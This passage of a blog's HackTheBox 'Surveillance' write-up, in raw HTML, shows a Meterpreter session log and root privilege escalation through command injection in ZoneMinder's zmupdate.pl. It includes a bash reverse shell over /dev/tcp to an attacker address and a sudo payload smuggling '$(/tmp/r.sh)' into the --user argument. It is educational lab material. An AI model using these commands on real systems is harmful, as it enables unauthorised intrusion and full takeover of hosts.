+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Got</span> <span class="n">Token</span><span class="p">:</span> <span class="n">key</span><span class="p">:</span><span class="mi">2</span><span class="n">c845697e6a6bc33c79b12bb323b79878b1f0db1</span><span class="p">,</span><span class="mi">1702229326</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Executing</span> <span class="n">nix</span> <span class="n">Command</span> <span class="k">for</span> <span class="n">cmd</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">stage</span> <span class="p">(</span><span class="mi">3045380</span> <span class="n">bytes</span><span class="p">)</span> <span class="n">to</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">171.36</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Meterpreter</span> <span class="n">session</span> <span class="mi">1</span> <span class="n">opened</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.134</span><span class="p">:</span><span class="mi">4444</span> <span class="o">-&gt;</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">171.36</span><span class="p">:</span><span class="mi">45848</span><span class="p">)</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">10</span> <span class="mi">11</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">48</span> <span class="o">-</span><span class="mi">0600</span>
+</span></span><span class="line"><span class="cl"><span class="n">id</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Payload</span> <span class="n">sent</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">id</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Unknown</span> <span class="n">command</span><span class="p">:</span> <span class="n">id</span>
+</span></span><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">Process</span> <span class="mi">25281</span> <span class="n">created</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Channel</span> <span class="mi">1</span> <span class="n">created</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">id</span>
+</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">zoneminder</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">zoneminder</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">zoneminder</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="command-injection-in-zmupdatepl">Command injection in zmupdate.pl</h3>
+<p>Checking new sudo privs:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for zoneminder on surveillance:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+</span></span><span class="line"><span class="cl">    use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User zoneminder may run the following commands on surveillance:
+</span></span><span class="line"><span class="cl">    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>so we can run .pl files from bin. our options:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">zoneminder</span><span class="err">@</span><span class="n">surveillance</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">zoneminder</span><span class="o">/</span><span class="n">www</span><span class="o">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">al</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zm</span><span class="o">*.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">43027</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmaudit</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">12939</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmcamtool</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">6043</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmcontrol</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">26232</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmdc</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">35206</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmfilter</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">5640</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmonvif</span><span class="o">-</span><span class="n">probe</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">19386</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmonvif</span><span class="o">-</span><span class="n">trigger</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">13994</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmpkg</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">17492</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmrecover</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4815</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmstats</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">2133</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmsystemctl</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">13111</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmtelemetry</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">5340</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmtrack</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">18482</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmtrigger</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">45421</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmupdate</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">8205</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmvideo</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">7022</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmwatch</span><span class="o">.</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">19655</span> <span class="n">Nov</span> <span class="mi">23</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">zmx10</span><span class="o">.</span><span class="n">pl</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Within <code>zmupdate.pl</code>, we might eventually see that a mysqldump command is being run. I recognize this as a binary, and with no absolute path it is likely being invoked using some kind of shell like bash:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$response</span> <span class="o">=~</span><span class="sr"> /^[yY]$/</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">my</span> <span class="p">(</span> <span class="nv">$host</span><span class="p">,</span> <span class="nv">$portOrSocket</span> <span class="p">)</span> <span class="o">=</span> <span class="p">(</span> <span class="nv">$Config</span><span class="p">{</span><span class="n">ZM_DB_HOST</span><span class="p">}</span> <span class="o">=~</span><span class="sr"> /^([^:]+)(?::(.+))?$/</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">my</span> <span class="nv">$command</span> <span class="o">=</span> <span class="s">&#39;mysqldump&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$super</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$command</span> <span class="o">.=</span> <span class="s">&#39; --defaults-file=/etc/mysql/debian.cnf&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">elsif</span> <span class="p">(</span><span class="nv">$dbUser</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$command</span> <span class="o">.=</span> <span class="s">&#39; -u&#39;</span><span class="o">.</span><span class="nv">$dbUser</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$command</span> <span class="o">.=</span> <span class="s">&#39; -p\&#39;&#39;</span><span class="o">.</span><span class="nv">$dbPass</span><span class="o">.</span><span class="s">&#39;\&#39;&#39;</span> <span class="k">if</span> <span class="nv">$dbPass</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In this case if we supply a dbUser (&ndash;user flag), we can perform command injection. My payload is to run a reverse shell, using a basic payload from revshells:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">zoneminder@surveillance:/tmp$ cat r.sh
+</span></span><span class="line"><span class="cl">bash -i &gt;&amp; /dev/tcp/10.10.14.102/8080 0&gt;&amp;1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Payload used:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo /usr/bin/zmupdate.pl --version=1.3 --user=&#39;$(/tmp/r.sh)&#39; --pass=asdf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now on my listener, I get a connection back.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Surveillance]
+</span></span><span class="line"><span class="cl">└─$ nc -nvlp 8080
+</span></span><span class="line"><span class="cl">listening on [any] 8080 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.102] from (UNKNOWN) [10.10.11.245] 60952
+</span></span><span class="line"><span class="cl">root@surveillance:/tmp# id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
+</span></span><span class="line"><span class="cl">root@surveillance:/tmp# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/craftcms/">CraftCMS</a>
+        
+            <a href="/tags/webshell/">Webshell</a>
+        
+            <a href="/tags/env/">Env</a>
+        
+            <a href="/tags/mysql/">MySQL</a>
+        
+            <a href="/tags/hashcat/">Hashcat</a>
+        
+            <a href="/tags/zoneminder/">ZoneMinder</a>
+        
+            <a href="/tags/chisel/">Chisel</a>
+        
+            <a href="/tags/command-injection/">Command Injection</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-devvortex/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-devvortex/Devvortex.61ba3466bff8da52f89d2bb6417fb83a_hu23e19c6470d626aad1f7a9500cb54bd9_256718_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Devvortex"
+                        
+                        data-hash="md5-Ybo0Zr/42lL4nSu2QX&#43;4Og==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Devvortex</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-monitorstwo/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-monitorstwo/MonitorsTwo.7bcf0cb787855b0537bc7c5327c0f7dd_hu024166abe3ac2c9d2978be07dc4c2b69_418807_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - MonitorsTwo"
+                        
+                        data-hash="md5-e88Mt4eFWwU3vHxTJ8D33Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - MonitorsTwo</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-codify/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-codify/Codify.d19bf609d86d6ee490cdde52cb652366_hu3d443decdd598a8807502f48a4e7eec5_334811_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Codify"
+                        
+                        data-hash="md5-0Zv2CdhtbuSQzd5Sy2UjZg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Codify</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-cozyhosting/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-cozyhosting/CozyHosting.5c10fb7439d426645511c0790ed3ccb2_hu57b040a445aedb3fdc2bc656dc9a4afd_278920_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - CozyHosting"
+                        
+                        data-hash="md5-XBD7dDnUJmRVEcB5DtPMsg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - CozyHosting</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-sau/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-sau/Sau.e47c82080c294ed27892e64446e0941f_hu395bd5edbfd24d434ffdbc0f1375eb9f_446175_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Sau"
+                        
+                        data-hash="md5-5HyCCAwpTtJ4kuZERuCUHw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Sau</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2023 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#directory-fuzzing-with-feroxbuster">Directory Fuzzing with feroxbuster</a></li>
+        <li><a href="#researching-potential-public-vulnerabilities-in-an-old-craftcms-version">Researching potential public vulnerabilities in an old CraftCMS version</a></li>
+      </ol>
+    </li>
+    <li><a href="#lateral-movement">Lateral Movement</a>
+      <ol>
+        <li><a href="#enumeration-of-environment">Enumeration of environment</a></li>
+        <li><a href="#finding-password-hashes-in-mysql">Finding password hashes in mysql</a></li>
+        <li><a href="#examining-zoneminder-internal-webserver">Examining ZoneMinder internal webserver</a></li>
+        <li><a href="#finding-more-hashes-in-a-backup-file">Finding more hashes in a backup file</a></li>
+        <li><a href="#returning-to-zoneminder-with-valid-credentials">Returning to ZoneMinder with valid credentials</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#command-injection-in-zmupdatepl">Command injection in zmupdate.pl</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+
+    </body>
+</html>
